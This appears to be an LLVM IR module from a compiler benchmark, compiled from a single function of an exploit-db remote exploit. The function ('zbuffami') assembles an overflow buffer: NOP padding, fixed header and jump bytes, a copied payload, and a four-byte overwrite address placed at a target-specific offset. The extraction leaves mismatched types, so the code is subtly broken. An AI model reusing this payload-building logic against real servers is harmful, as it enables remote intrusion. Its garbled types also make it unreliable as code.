; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_3615.c_zbuffami.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_3615.c_zbuffami.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_t = type { i32, i32, i64, i32, i32 }

@NOP = common dso_local global i8* null, align 8
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i32*, %struct.target_t*)* @zbuffami to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @zbuffami(i32* %0, %struct.target_t* %1) #0 {
  %3 = alloca i32*, align 8
  %4 = alloca %struct.target_t*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32*, align 8
  store i32* %0, i32** %3, align 8
  store %struct.target_t* %1, %struct.target_t** %4, align 8
  %7 = load i32*, i32** %3, align 8
  store i32* %7, i32** %6, align 8
  %8 = load i32*, i32** %6, align 8
  %9 = load i8*, i8** @NOP, align 8
  %10 = load %struct.target_t*, %struct.target_t** %4, align 8
  %11 = getelementptr inbounds %struct.target_t, %struct.target_t* %10, i32 0, i32 0
  %12 = load i32, i32* %11, align 8
  %13 = call i32 @memset(i32* %8, i8* %9, i32 %12)
  %14 = load i32*, i32** %6, align 8
  %15 = getelementptr inbounds i32, i32* %14, i32 1
  store i32* %15, i32** %6, align 8
  store i32 105, i32* %14, align 4
  %16 = load i32*, i32** %6, align 8
  %17 = getelementptr inbounds i32, i32* %16, i32 1
  store i32* %17, i32** %6, align 8
  store i32 105, i32* %16, align 4
  %18 = load i32*, i32** %6, align 8
  %19 = getelementptr inbounds i32, i32* %18, i32 1
  store i32* %19, i32** %6, align 8
  store i32 129, i32* %18, align 4
  %20 = load i32*, i32** %6, align 8
  %21 = getelementptr inbounds i32, i32* %20, i32 1
  store i32* %21, i32** %6, align 8
  store i32 128, i32* %20, align 4
  %22 = load i32*, i32** %6, align 8
  %23 = getelementptr inbounds i32, i32* %22, i32 1
  store i32* %23, i32** %6, align 8
  store i32 0, i32* %22, align 4
  %24 = load i32*, i32** %6, align 8
  %25 = getelementptr inbounds i32, i32* %24, i32 1
  store i32* %25, i32** %6, align 8
  store i32 0, i32* %24, align 4
  %26 = load i32*, i32** %6, align 8
  %27 = getelementptr inbounds i32, i32* %26, i32 1
  store i32* %27, i32** %6, align 8
  store i32 0, i32* %26, align 4
  %28 = load i32*, i32** %6, align 8
  %29 = getelementptr inbounds i32, i32* %28, i32 1
  store i32* %29, i32** %6, align 8
  store i32 1, i32* %28, align 4
  %30 = load i32*, i32** %6, align 8
  %31 = getelementptr inbounds i32, i32* %30, i32 1
  store i32* %31, i32** %6, align 8
  store i32 0, i32* %30, align 4
  %32 = load i32*, i32** %6, align 8
  %33 = getelementptr inbounds i32, i32* %32, i32 1
  store i32* %33, i32** %6, align 8
  store i32 0, i32* %32, align 4
  %34 = load i32*, i32** %6, align 8
  %35 = getelementptr inbounds i32, i32* %34, i32 1
  store i32* %35, i32** %6, align 8
  store i32 0, i32* %34, align 4
  %36 = load i32*, i32** %6, align 8
  %37 = getelementptr inbounds i32, i32* %36, i32 1
  store i32* %37, i32** %6, align 8
  store i32 0, i32* %36, align 4
  %38 = load i32*, i32** %6, align 8
  %39 = getelementptr inbounds i32, i32* %38, i32 1
  store i32* %39, i32** %6, align 8
  store i32 192, i32* %38, align 4
  %40 = load i32*, i32** %6, align 8
  %41 = getelementptr inbounds i32, i32* %40, i32 1
  store i32* %41, i32** %6, align 8
  store i32 24, i32* %40, align 4
  %42 = load i32*, i32** %6, align 8
  %43 = getelementptr inbounds i32, i32* %42, i32 1
  store i32* %43, i32** %6, align 8
  store i32 0, i32* %42, align 4
  %44 = load i32*, i32** %6, align 8
  %45 = getelementptr inbounds i32, i32* %44, i32 1
  store i32* %45, i32** %6, align 8
  store i32 12, i32* %44, align 4
  %46 = load i32*, i32** %6, align 8
  %47 = getelementptr inbounds i32, i32* %46, i32 1
  store i32* %47, i32** %6, align 8
  store i32 7, i32* %46, align 4
  %48 = load i32*, i32** %6, align 8
  %49 = getelementptr inbounds i32, i32* %48, i32 1
  store i32* %49, i32** %6, align 8
  store i32 235, i32* %48, align 4
  %50 = load i32*, i32** %6, align 8
  %51 = getelementptr inbounds i32, i32* %50, i32 1
  store i32* %51, i32** %6, align 8
  store i32 255, i32* %50, align 4
  %52 = load i32*, i32** %6, align 8
  %53 = getelementptr inbounds i32, i32* %52, i32 1
  store i32* %53, i32** %6, align 8
  store i32 255, i32* %52, align 4
  %54 = load i32*, i32** %6, align 8
  %55 = getelementptr inbounds i32, i32* %54, i32 1
  store i32* %55, i32** %6, align 8
  store i32 255, i32* %54, align 4
  %56 = load i32*, i32** %6, align 8
  %57 = getelementptr inbounds i32, i32* %56, i32 1
  store i32* %57, i32** %6, align 8
  store i32 255, i32* %56, align 4
  %58 = load i32*, i32** %6, align 8
  %59 = getelementptr inbounds i32, i32* %58, i32 1
  store i32* %59, i32** %6, align 8
  store i32 1, i32* %58, align 4
  %60 = load i32*, i32** %6, align 8
  %61 = getelementptr inbounds i32, i32* %60, i32 1
  store i32* %61, i32** %6, align 8
  store i32 232, i32* %60, align 4
  store i32 0, i32* %5, align 4
  br label %62

62:                                               ; preds = %71, %2
  %63 = load i32, i32* %5, align 4
  %64 = icmp slt i32 %63, 2
  br i1 %64, label %65, label %76

65:                                               ; preds = %62
  %66 = load i32*, i32** %6, align 8
  %67 = getelementptr inbounds i32, i32* %66, i32 1
  store i32* %67, i32** %6, align 8
  store i32 127, i32* %66, align 4
  %68 = load i32*, i32** %6, align 8
  %69 = load i8*, i8** @NOP, align 8
  %70 = call i32 @memset(i32* %68, i8* %69, i32 127)
  br label %71

71:                                               ; preds = %65
  %72 = load i32, i32* %5, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %5, align 4
  %74 = load i32*, i32** %6, align 8
  %75 = getelementptr inbounds i32, i32* %74, i64 127
  store i32* %75, i32** %6, align 8
  br label %62

76:                                               ; preds = %62
  %77 = load i32*, i32** %6, align 8
  %78 = getelementptr inbounds i32, i32* %77, i32 1
  store i32* %78, i32** %6, align 8
  store i32 2, i32* %77, align 4
  %79 = load i8*, i8** @NOP, align 8
  %80 = ptrtoint i8* %79 to i32
  %81 = load i32*, i32** %6, align 8
  %82 = getelementptr inbounds i32, i32* %81, i32 1
  store i32* %82, i32** %6, align 8
  store i32 %80, i32* %81, align 4
  %83 = load i8*, i8** @NOP, align 8
  %84 = ptrtoint i8* %83 to i32
  %85 = load i32*, i32** %6, align 8
  %86 = getelementptr inbounds i32, i32* %85, i32 1
  store i32* %86, i32** %6, align 8
  store i32 %84, i32* %85, align 4
  %87 = load i32*, i32** %6, align 8
  %88 = getelementptr inbounds i32, i32* %87, i32 1
  store i32* %88, i32** %6, align 8
  store i32 0, i32* %87, align 4
  %89 = load i32*, i32** %3, align 8
  %90 = load %struct.target_t*, %struct.target_t** %4, align 8
  %91 = getelementptr inbounds %struct.target_t, %struct.target_t* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i32, i32* %89, i64 %93
  %95 = getelementptr inbounds i32, i32* %94, i64 -1
  store i32* %95, i32** %6, align 8
  %96 = load i32*, i32** %6, align 8
  %97 = getelementptr inbounds i32, i32* %96, i32 -1
  store i32* %97, i32** %6, align 8
  store i32 46, i32* %96, align 4
  %98 = load i32*, i32** %6, align 8
  store i32 46, i32* %98, align 4
  %99 = load i32*, i32** %3, align 8
  %100 = load %struct.target_t*, %struct.target_t** %4, align 8
  %101 = getelementptr inbounds %struct.target_t, %struct.target_t* %100, i32 0, i32 1
  %102 = load i32, i32* %101, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %99, i64 %103
  %105 = load %struct.target_t*, %struct.target_t** %4, align 8
  %106 = getelementptr inbounds %struct.target_t, %struct.target_t* %105, i32 0, i32 4
  %107 = load i32, i32* %106, align 4
  %108 = load %struct.target_t*, %struct.target_t** %4, align 8
  %109 = getelementptr inbounds %struct.target_t, %struct.target_t* %108, i32 0, i32 4
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @strlen(i32 %110)
  %112 = call i32 @memcpy(i32* %104, i32 %107, i32 %111)
  %113 = load %struct.target_t*, %struct.target_t** %4, align 8
  %114 = getelementptr inbounds %struct.target_t, %struct.target_t* %113, i32 0, i32 3
  %115 = load i32, i32* %114, align 8
  %116 = and i32 %115, 255
  %117 = load i32*, i32** %3, align 8
  %118 = load %struct.target_t*, %struct.target_t** %4, align 8
  %119 = getelementptr inbounds %struct.target_t, %struct.target_t* %118, i32 0, i32 2
  %120 = load i64, i64* %119, align 8
  %121 = getelementptr inbounds i32, i32* %117, i64 %120
  store i32 %116, i32* %121, align 4
  %122 = load %struct.target_t*, %struct.target_t** %4, align 8
  %123 = getelementptr inbounds %struct.target_t, %struct.target_t* %122, i32 0, i32 3
  %124 = load i32, i32* %123, align 8
  %125 = and i32 %124, 65280
  %126 = ashr i32 %125, 8
  %127 = load i32*, i32** %3, align 8
  %128 = load %struct.target_t*, %struct.target_t** %4, align 8
  %129 = getelementptr inbounds %struct.target_t, %struct.target_t* %128, i32 0, i32 2
  %130 = load i64, i64* %129, align 8
  %131 = add i64 %130, 1
  %132 = getelementptr inbounds i32, i32* %127, i64 %131
  store i32 %126, i32* %132, align 4
  %133 = load %struct.target_t*, %struct.target_t** %4, align 8
  %134 = getelementptr inbounds %struct.target_t, %struct.target_t* %133, i32 0, i32 3
  %135 = load i32, i32* %134, align 8
  %136 = and i32 %135, 16711680
  %137 = ashr i32 %136, 16
  %138 = load i32*, i32** %3, align 8
  %139 = load %struct.target_t*, %struct.target_t** %4, align 8
  %140 = getelementptr inbounds %struct.target_t, %struct.target_t* %139, i32 0, i32 2
  %141 = load i64, i64* %140, align 8
  %142 = add i64 %141, 2
  %143 = getelementptr inbounds i32, i32* %138, i64 %142
  store i32 %137, i32* %143, align 4
  %144 = load %struct.target_t*, %struct.target_t** %4, align 8
  %145 = getelementptr inbounds %struct.target_t, %struct.target_t* %144, i32 0, i32 3
  %146 = load i32, i32* %145, align 8
  %147 = and i32 %146, -16777216
  %148 = lshr i32 %147, 24
  %149 = load i32*, i32** %3, align 8
  %150 = load %struct.target_t*, %struct.target_t** %4, align 8
  %151 = getelementptr inbounds %struct.target_t, %struct.target_t* %150, i32 0, i32 2
  %152 = load i64, i64* %151, align 8
  %153 = add i64 %152, 3
  %154 = getelementptr inbounds i32, i32* %149, i64 %153
  store i32 %148, i32* %154, align 4
  ret void
}

declare dso_local i32 @memset(i32*, i8*, i32) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
